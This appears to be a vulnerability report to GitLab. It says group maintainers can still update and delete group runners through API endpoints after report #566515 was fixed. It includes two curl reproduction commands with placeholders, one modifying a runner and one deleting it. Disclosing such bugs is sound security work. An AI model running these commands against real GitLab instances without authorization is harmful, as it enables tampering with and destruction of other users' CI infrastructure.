### Summary  
Hello,

This report #566515 is fixed but there are couple of endpoints in API which allows Group Maintainers to update and even delete the group runners.

### Steps to reproduce

1. As a group maintainer, obtain your personal access token  
2. Run the following API endpoints to update/delete


**Update**  
```  
curl --request PUT --header "PRIVATE-TOKEN: <YourTokenHere>" "https://gitlab.com/api/v4/runners/<GroupRunnerID>" --form "description=test-1-20150125-test" --form "tag_list=ruby,mysql,tag1,tag2"  
```

**Delete**

```  
curl --request DELETE --header "PRIVATE-TOKEN: <YourTokenHere>" "https://gitlab.com/api/v4/runners/<GroupRunnerID>" --form "description=test-1-20150125-test" --form "tag_list=ruby,mysql,tag1,tag2"  
```

`GroupRunnerID` can be easily obtained using projects ci/cd settings where ID is displayed in UI


### What is the current *bug* behavior?

Group  Maintainers are allowed  to update/delete group runners using API

### What is the expected *correct* behavior?  
Group Maintainers should not be able to do this 



### Output of checks

 This bug happens on GitLab.com and possibly on omnibus installations too
